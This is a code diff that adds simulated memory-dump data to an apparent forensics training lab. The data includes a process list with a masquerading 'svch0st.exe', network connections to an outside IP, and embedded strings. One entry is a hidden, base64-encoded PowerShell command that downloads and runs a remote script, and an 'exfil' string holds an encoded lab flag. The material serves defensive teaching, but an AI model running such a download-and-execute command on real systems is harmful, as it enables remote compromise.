@@ -35,9 +35,41 @@ function pad(s,n){s=String(s);return s.length>=n?s+' ':s+' '.repeat(n-s.length);
 
 export const LAB={memOut:[], rePatched:{0:false,1:false,2:false}, reVerdict:{}, pkts:null, pcapMeta:null, pcapSel:null, pcapFilter:'', logTab:'auth', logFilter:'', unpPc:0, unpRun:false, memPc:0, memRun:false};
 
-
-
-
+/* ---------------- LAB: MEMORY TRIAGE ---------------- */
+const PS_B64='SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcveC5wczEnKQ==';
+const MEM={
+ profile:'Win10x64_19041 · 4096 MiB raw dump · KDBG 0xf80761a02b20 · 41 processes',
+ ps:[
+  [4,0,'System',138,'08:21:01'],
+  [372,4,'smss.exe',2,'08:21:04'],
+  [512,504,'csrss.exe',11,'08:21:06'],
+  [604,596,'wininit.exe',1,'08:21:06'],
+  [680,604,'services.exe',6,'08:21:07'],
+  [772,680,'svchost.exe',18,'08:21:07'],
+  [1188,680,'svchost.exe',24,'08:21:08'],
+  [1620,680,'lsass.exe',9,'08:21:08'],
+  [2904,2880,'explorer.exe',58,'08:24:11'],
+  [3460,2904,'chrome.exe',31,'08:25:02'],
+  [4880,2904,'svch0st.exe',7,'09:47:55'],
+  [5012,4880,'powershell.exe',9,'09:47:56'],
+ ],
+ net:[
+  ['TCPv4','10.0.2.15:49677','13.107.42.14:443','ESTABLISHED',3460],
+  ['TCPv4','10.0.2.15:445','0.0.0.0:0','LISTENING',4],
+  ['TCPv4','10.0.2.15:50331','185.220.101.47:443','ESTABLISHED',4880],
+  ['UDPv4','10.0.2.15:138','*:*','',772],
+ ],
+ cmd:{
+  3460:'"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
+  4880:'"C:\\Users\\victim\\AppData\\Local\\Temp\\svch0st.exe"',
+  5012:'powershell.exe -nop -w hidden -enc '+PS_B64,
+ },
+ strs:{
+  4880:['svch0st.exe','Global\\BV-7f3a-MTX','cdn-telemetry.xyz','185.220.101.47',
+        'User-Agent: Mozilla/5.0 (compatible; bvbot/1.0)','GET /x.ps1 HTTP/1.1',
+        'staging dir: C:\\Windows\\Temp\\~bv.tmp','exfil>>QlZ7bTNtMHJ5X2QwbnRfbDEzfQ==','done.'],
+ },
+};
 
 
 function memBanner(){return [
